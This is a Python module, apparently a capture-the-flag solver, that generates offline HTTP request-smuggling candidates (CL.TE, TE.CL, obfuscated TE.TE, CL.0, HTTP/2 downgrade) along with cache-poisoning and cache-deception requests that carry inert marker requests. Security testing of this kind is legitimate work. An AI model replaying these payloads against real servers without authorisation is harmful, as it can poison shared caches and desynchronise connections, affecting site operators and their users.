#!/usr/bin/env python3
"""Offline HTTP desynchronization and cache-ambiguity candidate generator.

This module creates byte-exact *candidate requests* for a player to review and
replay through an assigned target's scoped tooling.  It has no HTTP client and
never opens a socket.  CL.TE, TE.CL, TE.TE, CL.0 and HTTP/2-downgrade shapes
are represented explicitly, including why a front/back parser disagreement is
required.  Cache-poisoning and cache-deception helpers likewise return inert
request strings and paths only.

The candidates use a visible marker request rather than flag guesses.  A
response timing change or marker reflection is evidence to investigate, not a
claim that desynchronization occurred.

CLI examples (all offline)::

    .venv/bin/python solvers/web/http_desync.py desync app.internal --json
    .venv/bin/python solvers/web/http_desync.py te --json
    .venv/bin/python solvers/web/http_desync.py cache app.internal \
        --path /account --marker-host marker.invalid --json
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import sys
from typing import Any, Iterable, Sequence


MAX_FIELD = 4096
MAX_BODY = 128 * 1024
MAX_CANDIDATES = 64


class DesyncInputError(ValueError):
    """Raised for malformed or over-limit offline generator inputs."""


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover - tested through main
        raise DesyncInputError(message)


def _field(value: Any, label: str, *, maximum: int = MAX_FIELD,
           allow_space: bool = True) -> str:
    if not isinstance(value, str) or not value:
        raise DesyncInputError(f"{label} must be non-empty text")
    if len(value) > maximum:
        raise DesyncInputError(f"{label} exceeds {maximum} characters")
    if any(ch in value for ch in "\r\n\x00"):
        raise DesyncInputError(f"{label} must contain no CR, LF, or NUL")
    if not allow_space and any(ch.isspace() for ch in value):
        raise DesyncInputError(f"{label} must contain no whitespace")
    return value


def _host(value: str) -> str:
    value = _field(value, "host", maximum=253, allow_space=False)
    if any(ch in value for ch in "/?#@"):
        raise DesyncInputError("host contains a URL delimiter")
    try:
        value.encode("ascii")
    except UnicodeEncodeError as exc:
        raise DesyncInputError("host must be ASCII (supply an explicit IDNA spelling)") from exc
    return value


def _path(value: str, label: str = "path") -> str:
    value = _field(value, label, maximum=MAX_FIELD)
    if not (value.startswith("/") or value == "*"):
        raise DesyncInputError(f"{label} must start with /")
    if any(ch.isspace() for ch in value):
        raise DesyncInputError(f"{label} must contain no raw whitespace")
    return value


def _token(value: str, label: str) -> str:
    value = _field(value, label, maximum=128, allow_space=False)
    if not re.fullmatch(r"[A-Za-z0-9_.:-]+", value):
        raise DesyncInputError(f"{label} contains characters unsafe for an HTTP marker")
    return value


def _method(value: str) -> str:
    value = _field(value, "method", maximum=32, allow_space=False).upper()
    if not re.fullmatch(r"[A-Z]+", value):
        raise DesyncInputError("method must contain ASCII letters only")
    return value


def build_http1_request(method: str, path: str, host: str,
                        headers: Sequence[tuple[str, str]] = (),
                        body: str | bytes | bytearray = b"") -> bytes:
    """Serialize a bounded HTTP/1.1 request while preserving header order/duplicates."""

    method, path, host = _method(method), _path(path), _host(host)
    if isinstance(body, str):
        try:
            body_b = body.encode("latin-1")
        except UnicodeError as exc:
            raise DesyncInputError("body must be latin-1 encodable text") from exc
    elif isinstance(body, (bytes, bytearray)):
        body_b = bytes(body)
    else:
        raise DesyncInputError("body must be text or bytes")
    if len(body_b) > MAX_BODY:
        raise DesyncInputError(f"body exceeds {MAX_BODY} bytes")
    if not isinstance(headers, (list, tuple)):
        raise DesyncInputError("headers must be a sequence of (name, value) pairs")
    if len(headers) > 64:
        raise DesyncInputError("header count exceeds 64")
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    for name, value in headers:
        name = _field(name, "header name", maximum=128, allow_space=True)
        value = _field(value, f"header {name}", maximum=MAX_FIELD)
        # Deliberately permit whitespace before ':' because TE obfuscation is
        # part of this generator, but reject every other non-visible byte.
        if not re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]+[ \t]*", name):
            raise DesyncInputError(f"invalid header name {name!r}")
        if any(ord(ch) < 32 and ch != "\t" for ch in value):
            raise DesyncInputError(f"header {name!r} contains a control character")
        lines.append(f"{name}: {value}")
    head = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1")
    return head + body_b


def _display(raw: bytes) -> str:
    """Round-trip-safe latin-1 request text for JSON and terminal rendering."""

    return raw.decode("latin-1")


def _candidate(rank: int, technique: str, variant: str, raw: bytes, *,
               requirement: str, interpretation: str,
               h2: dict[str, Any] | None = None) -> dict[str, Any]:
    row: dict[str, Any] = {
        "rank": rank,
        "technique": technique,
        "variant": variant,
        "request": _display(raw),
        "request_base64": base64.b64encode(raw).decode("ascii"),
        "wire_length": len(raw),
        "requirement": requirement,
        "interpretation": interpretation,
        "candidate_only": True,
        "offline": True,
        "network_requests": 0,
    }
    if h2 is not None:
        row["http2_input"] = h2
    return row


def transfer_encoding_variants() -> list[dict[str, Any]]:
    """Return a bounded catalog of TE spellings with parser-disagreement notes."""

    variants = [
        ("canonical", [("Transfer-Encoding", "chunked")],
         "control spelling understood by conforming HTTP/1.1 parsers"),
        ("ows_tab", [("Transfer-Encoding", "\tchunked")],
         "front and back disagree on optional whitespace normalization"),
        ("name_space", [("Transfer-Encoding ", "chunked")],
         "one parser trims whitespace from the header name"),
        ("value_prefix", [("Transfer-Encoding", "xchunked")],
         "one parser performs a substring or suffix match for chunked"),
        ("value_suffix", [("Transfer-Encoding", "chunked x")],
         "one parser accepts junk after the transfer coding"),
        ("comma_identity", [("Transfer-Encoding", "chunked, identity")],
         "parsers choose different transfer codings from a comma list"),
        ("duplicate_identity_first", [("Transfer-Encoding", "identity"),
                                      ("Transfer-Encoding", "chunked")],
         "parsers select different duplicate Transfer-Encoding fields"),
        ("duplicate_chunked_first", [("Transfer-Encoding", "chunked"),
                                     ("Transfer-Encoding", "identity")],
         "parsers select different duplicate Transfer-Encoding fields"),
        ("mixed_case", [("Transfer-encoding", "cHuNkEd")],
         "a broken filter compares transfer-coding tokens case-sensitively"),
    ]
    return [{
        "rank": index,
        "name": name,
        "headers": [{"name": key, "value": value} for key, value in headers],
        "requirement": requirement,
        "offline": True,
        "network_requests": 0,
    } for index, (name, headers, requirement) in enumerate(variants, 1)]


def _inner_request(host: str, probe_path: str, marker: str) -> bytes:
    return build_http1_request(
        "GET", probe_path, host,
        (("X-CSCTF-Desync", marker), ("Connection", "close")),
    )


def generate_desync_candidates(host: str, *, path: str = "/",
                               probe_path: str = "/__csctf_desync_marker__",
                               marker: str = "CSCTF_DESYNC_MARKER",
                               method: str = "POST") -> list[dict[str, Any]]:
    """Return CL.TE, TE.CL, TE.TE, CL.0 and H2-downgrade request shapes."""

    host, path, probe_path = _host(host), _path(path), _path(probe_path, "probe_path")
    marker, method = _token(marker, "marker"), _method(method)
    inner = _inner_request(host, probe_path, marker)
    rows: list[dict[str, Any]] = []

    # Front end honors Content-Length and consumes the entire body.  Back end
    # honors TE, stops at the zero chunk, and treats `inner` as the next request.
    clte_body = b"0\r\n\r\n" + inner
    clte = build_http1_request(method, path, host, (
        ("Content-Length", str(len(clte_body))),
        ("Transfer-Encoding", "chunked"),
        ("Connection", "keep-alive"),
    ), clte_body)
    rows.append(_candidate(
        len(rows) + 1, "CL.TE", "canonical", clte,
        requirement="the front end honors Content-Length while the back end honors Transfer-Encoding",
        interpretation="the back end ends the first request at 0-chunk and leaves the marker request queued",
    ))

    # Front end honors TE and consumes a single chunk containing `inner`.
    # Back end honors CL and consumes only the chunk-size line; `inner` starts
    # exactly at the next byte boundary.
    prefix = f"{len(inner):x}\r\n".encode("ascii")
    tecl_body = prefix + inner + b"\r\n0\r\n\r\n"
    tecl = build_http1_request(method, path, host, (
        ("Content-Length", str(len(prefix))),
        ("Transfer-Encoding", "chunked"),
        ("Connection", "keep-alive"),
    ), tecl_body)
    rows.append(_candidate(
        len(rows) + 1, "TE.CL", "canonical", tecl,
        requirement="the front end honors Transfer-Encoding while the back end honors Content-Length",
        interpretation="the back end consumes the chunk-size line and leaves the marker request queued",
    ))

    # TE.TE rows retain CL.TE's zero-chunk boundary but vary a second TE field.
    # Keep the set deliberately small: this is a planner, not a request sweeper.
    for variant in transfer_encoding_variants()[2:8]:
        variant_headers = [(item["name"], item["value"]) for item in variant["headers"]]
        tete_headers = [("Content-Length", str(len(clte_body)))] + variant_headers
        # Ensure a second, canonical field for single-field obfuscations.
        if len(variant_headers) == 1:
            tete_headers.append(("Transfer-Encoding", "chunked"))
        tete_headers.append(("Connection", "keep-alive"))
        raw = build_http1_request(method, path, host, tete_headers, clte_body)
        rows.append(_candidate(
            len(rows) + 1, "TE.TE", variant["name"], raw,
            requirement=variant["requirement"],
            interpretation="front and back choose different duplicate/obfuscated TE semantics",
        ))

    cl0 = build_http1_request(method, path, host, (
        ("Content-Length", str(len(inner))),
        ("Connection", "keep-alive"),
    ), inner)
    rows.append(_candidate(
        len(rows) + 1, "CL.0", "body_ignored", cl0,
        requirement="the front end forwards a body but the back end treats this request as bodyless",
        interpretation="the marker request remains in the back-end connection after the first request",
    ))

    # H2 values are metadata for an H2-capable replay tool.  `request` is the
    # deterministic H1 representation expected after a vulnerable downgrade.
    h2_headers = {
        ":method": method,
        ":scheme": "https",
        ":authority": host,
        ":path": path,
        "content-length": "0",
        "x-csctf-desync": marker,
    }
    downgraded = build_http1_request(method, path, host, (
        ("Content-Length", "0"),
        ("X-CSCTF-Desync", marker),
    ), inner)
    rows.append(_candidate(
        len(rows) + 1, "H2.CL", "downgrade_body", downgraded,
        requirement="an H2 front end accepts DATA beyond content-length 0 and downgrades it onto a reused H1 connection",
        interpretation="the H1 back end sees the DATA bytes as a second marker request",
        h2={"pseudo_headers": h2_headers, "data_base64": base64.b64encode(inner).decode("ascii")},
    ))

    h2_te_headers = dict(h2_headers)
    h2_te_headers.pop("content-length")
    h2_te_headers["transfer-encoding"] = "chunked"
    h2te_body = b"0\r\n\r\n" + inner
    h2te = build_http1_request(method, path, host, (
        ("Transfer-Encoding", "chunked"),
        ("Connection", "keep-alive"),
    ), h2te_body)
    rows.append(_candidate(
        len(rows) + 1, "H2.TE", "forbidden_te_forwarded", h2te,
        requirement="an H2 front end forwards a forbidden Transfer-Encoding field during H1 downgrade",
        interpretation="the downgraded back end applies chunk framing and leaves the marker request queued",
        h2={"pseudo_headers": h2_te_headers, "data_base64": base64.b64encode(h2te_body).decode("ascii")},
    ))
    if len(rows) > MAX_CANDIDATES:  # defensive invariant
        raise DesyncInputError("candidate cap exceeded")
    return rows


def _cache_row(rank: int, family: str, name: str, *, request: bytes | None = None,
               path: str | None = None, requirement: str) -> dict[str, Any]:
    row: dict[str, Any] = {
        "rank": rank,
        "family": family,
        "name": name,
        "requirement": requirement,
        "candidate_only": True,
        "offline": True,
        "network_requests": 0,
    }
    if request is not None:
        row.update({
            "request": _display(request),
            "request_base64": base64.b64encode(request).decode("ascii"),
        })
    if path is not None:
        row["path"] = path
    return row


def cache_poisoning_candidates(host: str, *, path: str = "/",
                               marker_host: str = "cache-marker.invalid") -> list[dict[str, Any]]:
    """Build candidates for unkeyed routing/URL headers; perform no replay."""

    host, path, marker_host = _host(host), _path(path), _host(marker_host)
    headers = [
        ("x_forwarded_host", ("X-Forwarded-Host", marker_host),
         "the origin reflects X-Forwarded-Host while the cache key omits it"),
        ("x_host", ("X-Host", marker_host),
         "the origin uses X-Host while the cache key omits it"),
        ("forwarded_host", ("Forwarded", f"host={marker_host};proto=http"),
         "the origin trusts Forwarded while the cache key omits it"),
        ("x_original_url", ("X-Original-URL", f"/__{marker_host}__"),
         "the origin routes on X-Original-URL while the cache keys the visible path"),
        ("x_rewrite_url", ("X-Rewrite-URL", f"/__{marker_host}__"),
         "the origin routes on X-Rewrite-URL while the cache keys the visible path"),
        ("x_forwarded_scheme", ("X-Forwarded-Scheme", "http"),
         "the origin reflects a scheme-dependent absolute URL from an unkeyed header"),
    ]
    rows = []
    for name, header, requirement in headers:
        raw = build_http1_request("GET", path, host, (header, ("X-CSCTF-Cache", marker_host)))
        rows.append(_cache_row(len(rows) + 1, "poisoning", name, request=raw,
                               requirement=requirement))
    absolute = (f"GET http://{marker_host}{path} HTTP/1.1\r\nHost: {host}\r\n"
                f"X-CSCTF-Cache: {marker_host}\r\n\r\n").encode("ascii")
    rows.append(_cache_row(
        len(rows) + 1, "poisoning", "absolute_form", request=absolute,
        requirement="proxy and origin use different authorities when keying an absolute-form request",
    ))
    return rows


def cache_deception_candidates(path: str = "/account") -> list[dict[str, Any]]:
    """Return static-looking path spellings for cache/origin normalization comparisons."""

    path = _path(path).rstrip("/") or "/"
    values = [
        ("path_info_css", path + "/csctf-marker.css",
         "the origin ignores PATH_INFO while the cache keys the .css suffix"),
        ("semicolon_css", path + ";csctf-marker.css",
         "the origin strips path parameters while the cache keys the full path"),
        ("encoded_question", path + "%3fcsctf-marker.css",
         "cache and origin decode %3f at different stages"),
        ("encoded_semicolon", path + "%3bcsctf-marker.css",
         "cache and origin normalize an encoded path parameter differently"),
        ("encoded_slash", path + "%2fcsctf-marker.css",
         "cache and origin normalize an encoded slash differently"),
        ("double_slash", path + "//csctf-marker.css",
         "the origin collapses a slash while the cache retains it in the key"),
        ("dot_segment", path + "/..%2f" + path.strip("/") + "/csctf-marker.css",
         "cache and origin normalize encoded dot-segments differently"),
    ]
    return [_cache_row(index, "deception", name, path=value, requirement=requirement)
            for index, (name, value, requirement) in enumerate(values, 1)]


def cache_candidates(host: str, *, path: str = "/account",
                     marker_host: str = "cache-marker.invalid") -> dict[str, Any]:
    return {
        "poisoning": cache_poisoning_candidates(host, path=path, marker_host=marker_host),
        "deception": cache_deception_candidates(path),
        "note": "offline candidates only; compare a benign control and never infer poisoning from one response",
        "offline": True,
        "network_requests": 0,
    }


def _parser() -> argparse.ArgumentParser:
    parser = _Parser(description="Offline HTTP desync/cache candidate builder")
    sub = parser.add_subparsers(dest="cmd", required=True, parser_class=_Parser)

    desync = sub.add_parser("desync", help="generate desynchronization request shapes")
    desync.add_argument("host")
    desync.add_argument("--path", default="/")
    desync.add_argument("--probe-path", default="/__csctf_desync_marker__")
    desync.add_argument("--marker", default="CSCTF_DESYNC_MARKER")
    desync.add_argument("--method", default="POST")
    desync.add_argument("--technique", choices=("all", "cl.te", "te.cl", "te.te", "cl.0", "h2"),
                        default="all")
    desync.add_argument("--json", action="store_true")

    te = sub.add_parser("te", help="list bounded Transfer-Encoding spellings")
    te.add_argument("--json", action="store_true")

    cache = sub.add_parser("cache", help="generate cache poisoning/deception candidates")
    cache.add_argument("host")
    cache.add_argument("--path", default="/account")
    cache.add_argument("--marker-host", default="cache-marker.invalid")
    cache.add_argument("--json", action="store_true")
    return parser


def _filter_technique(rows: Iterable[dict[str, Any]], selection: str) -> list[dict[str, Any]]:
    rows = list(rows)
    if selection == "all":
        return rows
    wanted = selection.upper()
    if wanted == "H2":
        return [row for row in rows if row["technique"].startswith("H2.")]
    return [row for row in rows if row["technique"].upper() == wanted]


def _print_human(result: Any) -> None:
    if isinstance(result, dict):
        for family in ("poisoning", "deception"):
            print(f"{family}:")
            for row in result[family]:
                value = row.get("path", row.get("request", "").replace("\r", "\\r").replace("\n", "\\n"))
                print(f"  {row['rank']}. [{row['name']}] {value}")
        return
    for row in result:
        name = row.get("technique", row.get("name", "candidate"))
        variant = row.get("variant", row.get("name", ""))
        print(f"{row['rank']}. [{name}/{variant}] {row['requirement']}")
        if "request" in row:
            print(row["request"].replace("\r", "\\r").replace("\n", "\\n\n"))


def main(argv: list[str] | None = None) -> int:
    try:
        args = _parser().parse_args(argv)
        if args.cmd == "desync":
            result: Any = _filter_technique(
                generate_desync_candidates(args.host, path=args.path, probe_path=args.probe_path,
                                           marker=args.marker, method=args.method),
                args.technique,
            )
        elif args.cmd == "te":
            result = transfer_encoding_variants()
        else:
            result = cache_candidates(args.host, path=args.path, marker_host=args.marker_host)
    except (DesyncInputError, ValueError, TypeError, UnicodeError) as exc:
        print(f"http_desync: {exc}", file=sys.stderr)
        return 2

    if getattr(args, "json", False):
        print(json.dumps(result, indent=2, ensure_ascii=False, sort_keys=True))
    else:
        _print_human(result)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
